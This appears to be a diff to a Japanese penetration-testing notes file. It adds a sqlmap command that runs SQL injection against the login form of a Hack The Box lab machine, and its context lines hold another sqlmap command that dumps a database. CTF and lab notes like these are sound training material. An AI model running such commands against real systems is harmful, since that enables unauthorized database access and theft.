@@ -427,6 +427,14 @@ sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
 
 [実例machine](https://medium.com/@zlkidda/hack-the-box-popcorn-11f5c7f77f5e)
 
+ログインとパスワードの入力が必要な画面で、
+
+ ```
+ sqlmap -u http://10.10.10.6/torrent/login.php --data="password=test&username=test" --method POST --dbms MySQL --thread=5
+ ```
+
+している
+
 # 便利コマンド
 
 ### searchsploit -m で、
